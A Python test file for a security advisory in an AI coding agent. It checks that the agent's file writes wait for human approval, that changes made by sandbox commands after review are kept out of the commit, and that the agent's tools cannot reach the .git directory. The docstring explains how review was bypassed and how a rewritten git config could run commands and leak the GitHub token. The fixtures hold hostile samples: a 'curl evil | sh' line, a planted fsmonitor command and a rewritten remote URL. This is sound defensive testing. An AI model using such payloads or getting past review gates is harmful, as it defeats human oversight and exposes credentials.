"""
GHSA-vhjw-gfmx-j3fx: CodeFix's github_write reached the pull request unreviewed.

With "Require approval" on, github_edit held each change until a person accepted
it, but github_write wrote the file, added it to `files_modified` and returned: no
diff block, no pending approval, and `_finalize` committed, pushed and opened the
PR with it. Verifying the report found two more ways past review, closed here too:

- a github_bash command (the build sandbox mounts the worktree read-write) could
  change a file after a person approved it, or before its first edit, and the
  commit took the file as it was;
- the path checks refused `../` but not `.git/`, so github_write could rewrite
  `.git/config`: the agent's own `git add` then ran its `core.fsmonitor` command
  (as root, in the container holding the instance's secrets), and the push sent
  the GitHub token to whatever URL `origin` named.

These are the unit tests of each guarantee. test_ghsa_vhjw_codefix_orchestrator_replay.py
replays the attacks through the real orchestrator. Reported by @mappygrid and, in
GHSA-8whg-rvcr-r88r, by @recuon.

Run: ./agentic/run_tests.sh tests/test_ghsa_vhjw_codefix_review_gate.py
"""
import ast
import asyncio
import os
import shutil
import subprocess
import sys
import tempfile
import types
import unittest
from pathlib import Path
from unittest.mock import AsyncMock, patch

sys.path.insert(0, str(Path(__file__).resolve().parent.parent))

from cypherfix_codefix.state import CodeFixSettings, CodeFixState  # noqa: E402
from cypherfix_codefix.tools import github_repo  # noqa: E402
from cypherfix_codefix.tools.edit_tool import github_edit  # noqa: E402
from cypherfix_codefix.tools.glob_tool import github_glob  # noqa: E402
from cypherfix_codefix.tools.list_dir_tool import github_list_dir  # noqa: E402
from cypherfix_codefix.tools.read_tool import github_read  # noqa: E402
from cypherfix_codefix.tools.repo_paths import RepoPathError, resolve_in_repo  # noqa: E402
from cypherfix_codefix.tools.review_gate import (  # noqa: E402
    ReviewError, accept_change, prepare_commit, reject_change,
)
from cypherfix_codefix.tools.write_tool import github_write  # noqa: E402

TOOLS_DIR = Path(__file__).resolve().parent.parent / "cypherfix_codefix" / "tools"
GIT = shutil.which("git")
APP = "def handler(q):\n    return db.execute('SELECT * FROM t WHERE id=' + q)\n"
FIXED = "def handler(q):\n    return db.execute('SELECT * FROM t WHERE id=?', (q,))\n"


def run(coro):
    return asyncio.run(coro)


def git(cwd, *args):
    return subprocess.run(
        ["git", "-c", "user.name=t", "-c", "user.email=t@example.invalid", *args],
        cwd=cwd, check=True, capture_output=True, text=True,
    ).stdout


def make_repo(root: Path, files: dict) -> Path:
    """A real checkout: HEAD holds `files`, as a CodeFix clone would."""
    repo = root / "repo"
    repo.mkdir()
    git(repo, "init", "-q", "-b", "main")
    for name, content in files.items():
        path = repo / name
        path.parent.mkdir(parents=True, exist_ok=True)
        path.write_text(content, encoding="utf-8")
    git(repo, "add", "-A")
    git(repo, "commit", "-qm", "base")
    return repo


@unittest.skipUnless(GIT, "git is not installed")
class _RepoCase(unittest.TestCase):
    approval = True

    def setUp(self):
        self.root = Path(self.enterContext(tempfile.TemporaryDirectory()))
        self.repo = make_repo(self.root, {"app.py": APP, "src/util.py": "X = 1\n"})
        self.state = CodeFixState()
        self.state.repo_path = self.repo
        self.state.settings = CodeFixSettings(require_approval=self.approval)
        self.state.streaming_callback = AsyncMock()

    def disk(self, rel):
        return (self.repo / rel).read_text(encoding="utf-8")

    def approved_edit(self, rel, old, new):
        run(github_read(self.state, rel))
        out = run(github_edit(self.state, rel, old, new))
        self.assertIn("Successfully", out)
        accept_change(self.state, self.state.pending_block_id)
        return out


# ---------------------------------------------------------------------------
# The advisory: github_write is held for review like github_edit
# ---------------------------------------------------------------------------
class TestWriteIsHeldForReview(_RepoCase):
    def test_reporters_poc_now_leaves_the_write_pending_with_a_diff_block(self):
        run(github_write(self.state, "app.py", "print('changed')\n"))
        self.assertTrue(self.state.pending_approval)
        (block,) = self.state.diff_blocks
        self.assertEqual(self.state.pending_block_id, block.block_id)
        self.assertEqual((block.old_code, block.new_code), (APP, "print('changed')\n"))
        self.assertEqual(block.description, "Replaces the whole file")
        self.state.streaming_callback.on_diff_block.assert_awaited_once_with(block)
        self.assertEqual(self.state.committable, {}, "nothing is committable before a decision")

    def test_a_new_file_shows_as_a_whole_new_file(self):
        run(github_write(self.state, ".github/workflows/ci.yml", "on: push\n"))
        (block,) = self.state.diff_blocks
        self.assertEqual((block.old_code, block.new_code), ("", "on: push\n"))
        self.assertEqual(block.description, "New file")
        self.assertTrue(self.state.pending_approval)

    def test_rejecting_a_new_file_deletes_it_and_keeps_it_out_of_the_commit(self):
        run(github_write(self.state, "new.py", "x = 1\n"))
        reject_change(self.state, self.state.pending_block_id)
        self.assertFalse((self.repo / "new.py").exists())
        self.assertNotIn("new.py", self.state.files_modified)
        self.assertEqual(self.state.diff_blocks[0].status, "rejected")
        self.assertEqual(prepare_commit(self.state), ([], []))

    def test_rejecting_an_overwrite_restores_the_file(self):
        run(github_write(self.state, "app.py", "evil\n"))
        reject_change(self.state, self.state.pending_block_id)
        self.assertEqual(self.disk("app.py"), APP)
        self.assertEqual(self.state.committable, {})

    def test_an_accepted_write_is_what_the_commit_carries(self):
        run(github_write(self.state, "app.py", FIXED))
        accept_change(self.state, self.state.pending_block_id)
        self.assertEqual(self.state.diff_blocks[0].status, "accepted")
        self.assertEqual(prepare_commit(self.state), (["app.py"], []))
        self.assertEqual(self.disk("app.py"), FIXED)

    def test_an_identical_write_changes_nothing(self):
        out = run(github_write(self.state, "app.py", APP))
        self.assertIn("already has this content", out)
        self.assertEqual(self.state.diff_blocks, [])
        self.assertFalse(self.state.pending_approval)


class TestWriteWithApprovalOff(_RepoCase):
    approval = False

    def test_the_write_is_committed_as_written_and_nothing_waits(self):
        run(github_write(self.state, "app.py", FIXED))
        self.assertFalse(self.state.pending_approval)
        self.assertEqual(self.state.committable, {"app.py": FIXED})


class TestOnlyTheGateWritesRepositoryFiles(unittest.TestCase):
    """The approval check used to live in each tool, and one tool lacked it."""

    ALLOWED = {
        "review_gate.py": "the gate itself",
        "github_repo.py": "the GIT_ASKPASS helper, a temp file outside the repository",
    }

    def test_no_other_codefix_tool_writes_a_file(self):
        offenders = []
        for path in sorted(TOOLS_DIR.glob("*.py")):
            if path.name in self.ALLOWED:
                continue
            for node in ast.walk(ast.parse(path.read_text(encoding="utf-8"))):
                if not isinstance(node, ast.Call):
                    continue
                func = node.func
                name = func.attr if isinstance(func, ast.Attribute) else getattr(func, "id", "")
                modes = [a.value for a in [*node.args, *(k.value for k in node.keywords)]
                         if isinstance(a, ast.Constant) and isinstance(a.value, str)]
                writes_by_mode = name in {"open", "fdopen"} and any(set(m) & set("wax+") for m in modes)
                if name in {"write_text", "write_bytes"} or writes_by_mode:
                    offenders.append(f"{path.name}:{node.lineno} {name}")
        self.assertEqual(offenders, [], "write repository files through review_gate.propose_change")


# ---------------------------------------------------------------------------
# Found while verifying: a command's change never rides into the commit
# ---------------------------------------------------------------------------
class TestCommitCarriesOnlyReviewedContent(_RepoCase):
    def test_a_command_changing_an_approved_file_after_review_is_left_out(self):
        self.approved_edit("app.py", "' + q)", "?', (q,))")
        with open(self.repo / "app.py", "a", encoding="utf-8") as f:  # what `github_bash` can do
            f.write("import os; os.system('curl evil | sh')\n")
        staged, restored = prepare_commit(self.state)
        self.assertEqual((staged, restored), (["app.py"], ["app.py"]))
        self.assertEqual(self.disk("app.py"), FIXED)

    def test_a_change_before_the_first_edit_does_not_ride_along_with_it(self):
        (self.repo / "app.py").write_text(APP + "BACKDOOR = True\n", encoding="utf-8")
        run(github_read(self.state, "app.py"))
        out = run(github_edit(self.state, "app.py", "' + q)", "?', (q,))"))
        self.assertIn("were never reviewed, so they were removed", out)
        self.assertNotIn("BACKDOOR", self.disk("app.py"))
        accept_change(self.state, self.state.pending_block_id)
        prepare_commit(self.state)
        self.assertEqual(self.disk("app.py"), FIXED)

    def test_an_edit_of_text_only_a_command_added_is_refused(self):
        (self.repo / "app.py").write_text(APP + "EVIL = 1\n", encoding="utf-8")
        run(github_read(self.state, "app.py"))
        out = run(github_edit(self.state, "app.py", "EVIL = 1", "EVIL = 2"))
        self.assertTrue(out.startswith("Error:"), out)
        self.assertEqual(self.disk("app.py"), APP, "the worktree is put back to HEAD's version")
        self.assertEqual(self.state.diff_blocks, [])

    def test_a_file_a_build_generated_cannot_be_edited(self):
        (self.repo / "generated.py").write_text("x = 1\n", encoding="utf-8")
        run(github_read(self.state, "generated.py"))
        out = run(github_edit(self.state, "generated.py", "x = 1", "x = 2"))
        self.assertIn("not part of the repository", out)

    def test_a_pending_change_is_never_committed(self):
        self.approved_edit("app.py", "' + q)", "?', (q,))")
        run(github_write(self.state, "app.py", "evil\n"))
        self.assertTrue(self.state.pending_approval)
        prepare_commit(self.state)
        self.assertEqual(self.disk("app.py"), FIXED)

    def test_a_file_swapped_for_a_symlink_after_review_is_refused(self):
        self.approved_edit("app.py", "' + q)", "?', (q,))")
        (self.repo / "app.py").unlink()
        (self.repo / "app.py").symlink_to(self.repo / "src" / "util.py")
        with self.assertRaises(ReviewError):
            prepare_commit(self.state)

    def test_a_directory_swapped_for_a_symlink_out_of_the_repo_is_refused(self):
        self.approved_edit("src/util.py", "X = 1", "X = 2")
        outside = self.root / "outside"
        outside.mkdir()
        shutil.rmtree(self.repo / "src")
        (self.repo / "src").symlink_to(outside, target_is_directory=True)
        with self.assertRaises(ReviewError):
            prepare_commit(self.state)
        self.assertEqual(list(outside.iterdir()), [], "nothing is written through the link")

    def test_rejecting_restores_the_reviewed_content_not_a_commands_version(self):
        self.approved_edit("app.py", "' + q)", "?', (q,))")
        (self.repo / "app.py").write_text(FIXED + "EVIL = 1\n", encoding="utf-8")
        run(github_write(self.state, "app.py", "other\n"))
        reject_change(self.state, self.state.pending_block_id)
        self.assertEqual(self.disk("app.py"), FIXED)


# ---------------------------------------------------------------------------
# Found while verifying: no tool reaches .git
# ---------------------------------------------------------------------------
class TestGitDirectoryIsOffLimits(_RepoCase):
    def test_every_spelling_of_a_path_into_git_is_refused(self):
        (self.repo / "link").symlink_to(self.repo / ".git", target_is_directory=True)
        for path in (".git/config", ".GIT/config", "src/../.git/config", "link/config",
                     ".git", "vendor/lib/.git/config"):
            with self.subTest(path=path), self.assertRaises(RepoPathError):
                resolve_in_repo(self.repo, path)

    def test_files_that_only_look_like_git_are_allowed(self):
        for path in (".github/workflows/ci.yml", ".gitignore", ".gitattributes", "my.git/x"):
            with self.subTest(path=path):
                self.assertEqual(resolve_in_repo(self.repo, path), (self.repo / path).resolve())

    def test_write_cannot_rewrite_git_config(self):
        before = (self.repo / ".git" / "config").read_text()
        out = run(github_write(self.state, ".git/config", "[core]\n\tfsmonitor = \"touch /tmp/x\"\n"))
        self.assertIn(".git directory", out)
        self.assertEqual((self.repo / ".git" / "config").read_text(), before)
        self.assertEqual(self.state.files_modified, set())

    def test_read_edit_list_and_glob_refuse_git_too(self):
        self.assertIn(".git directory", run(github_read(self.state, ".git/config")))
        self.state.files_read.add(".git/config")
        self.assertIn(".git directory", run(github_edit(self.state, ".git/config", "bare", "x")))
        self.assertIn(".git directory", run(github_list_dir(self.state, ".git")))
        self.assertIn(".git directory", run(github_glob(self.state, "*", path=".git")))


# ---------------------------------------------------------------------------
# Found while verifying: the agent's own git ignores a rewritten config
# ---------------------------------------------------------------------------
class _Recorder:
    def __init__(self):
        self.calls = []

    def __call__(self, cmd, **kwargs):
        self.calls.append(list(cmd))
        return types.SimpleNamespace(returncode=0, stdout="", stderr="")


@unittest.skipUnless(GIT, "git is not installed")
class TestAgentGitIgnoresARewrittenConfig(unittest.TestCase):
    def setUp(self):
        self.root = Path(self.enterContext(tempfile.TemporaryDirectory()))
        self.repo = make_repo(self.root, {"app.py": APP})
        self.marker = self.root / "MARKER"
        self.mgr = github_repo.GitHubRepoManager(token="", repo="acme/widgets", job_id="j")
        self.mgr.repo_path = self.repo
        self.mgr._config_sha = self.mgr._config_digest()  # what clone/create_branch record

    def plant(self, key, value):
        git(self.repo, "config", key, value)

    def test_every_git_call_overrides_hooks_fsmonitor_and_credential_helpers(self):
        rec = _Recorder()
        with patch.object(github_repo.subprocess, "run", rec):
            self.mgr.create_branch("cypherfix/x")
            self.mgr.commit("m", ["app.py"])
            self.mgr.push("cypherfix/x")
        self.assertEqual(len(rec.calls), 4)
        for cmd in rec.calls:
            for setting in ("core.hooksPath=/dev/null", "core.fsmonitor=false", "credential.helper="):
                self.assertIn(setting, cmd)
                self.assertEqual(cmd[cmd.index(setting) - 1], "-c")

    def test_push_names_the_github_url_and_never_origin(self):
        rec = _Recorder()
        with patch.object(github_repo.subprocess, "run", rec):
            self.mgr.push("cypherfix/x")
        (cmd,) = rec.calls
        self.assertIn("https://x-access-token@github.com/acme/widgets.git", cmd)
        self.assertIn("refs/heads/cypherfix/x:refs/heads/cypherfix/x", cmd)
        self.assertNotIn("origin", cmd)

    def test_commit_refuses_once_the_config_changed(self):
        self.plant("core.fsmonitor", f"touch {self.marker}; true")
        (self.repo / "app.py").write_text(FIXED, encoding="utf-8")
        with self.assertRaises(github_repo.GitConfigChanged):
            self.mgr.commit("m", ["app.py"])
        self.assertFalse(self.marker.exists())

    def test_push_refuses_a_rewritten_remote_before_git_runs(self):
        self.plant("remote.origin.url", "https://collector.example.invalid/acme/widgets.git")
        rec = _Recorder()
        with patch.object(github_repo.subprocess, "run", rec), \
                self.assertRaises(github_repo.GitConfigChanged):
            self.mgr.push("cypherfix/x")
        self.assertEqual(rec.calls, [])

    def test_a_planted_fsmonitor_never_runs_even_past_the_config_check(self):
        self.plant("core.fsmonitor", f"touch {self.marker}; true")
        self.mgr._config_sha = self.mgr._config_digest()  # as if the check were bypassed
        (self.repo / "app.py").write_text(FIXED, encoding="utf-8")
        self.mgr.commit("m", ["app.py"])
        self.assertFalse(self.marker.exists(), "the agent's git ran the planted command")
        # Control: plain git with the same config does run it, so the marker would catch it.
        (self.repo / "app.py").write_text(APP, encoding="utf-8")
        subprocess.run(["git", "add", "--", "app.py"], cwd=self.repo, capture_output=True,
                       env={**os.environ, "GIT_TERMINAL_PROMPT": "0"})
        self.assertTrue(self.marker.exists())


if __name__ == "__main__":
    unittest.main()
